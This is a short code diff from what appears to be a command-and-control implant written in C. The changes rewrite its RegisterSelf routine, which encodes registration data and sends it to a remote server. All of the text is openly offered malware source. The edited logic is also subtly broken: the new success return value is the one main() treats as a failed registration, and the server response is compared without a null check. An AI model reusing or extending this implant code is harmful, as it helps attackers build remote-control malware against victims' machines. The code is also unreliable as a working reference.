@@ -40,7 +40,7 @@ BYTE *EncodeRegisterImplant(RegisterImplant *ri, size_t *bufferSize) {
 		return NULL;
 	}
 
-        DEBUG_PRINTF("[+] Successfully encoded: %llu\n", stream.bytes_written);
+        // DEBUG_PRINTF("[+] Successfully encoded: %llu\n", stream.bytes_written);
 	return registerBuffer;
 }
 
@@ -155,15 +155,12 @@ int RegisterSelf() {
 
 	size_t bufferSize = 0;
 	BYTE *registerBuffer = EncodeRegisterImplant(&ri, &bufferSize);
-	
 	LPBYTE response = SendToServer(POST_VERB, REGISTER_PATH, registerBuffer, bufferSize);
-	
-	if (response == NULL){
-                DEBUG_PRINTF("Bad response.");
-                DEBUG_PRINTF("response = %s", response);
+	if (strcmp((const char *)response, (const char *)REGISTRATION_SUCCESSFUL)){
+		return 0;
         }
 	
-	return 0;
+	return 1;
 }
 
 
@@ -171,7 +168,6 @@ int main() {
 	DEBUG_PRINTF("Starting Implant.\n");
 	
 	int result = RegisterSelf();
-
 	if (result == 1) {
 		DEBUG_PRINTF("Failed to register with the Server!\n");
 		return 1;
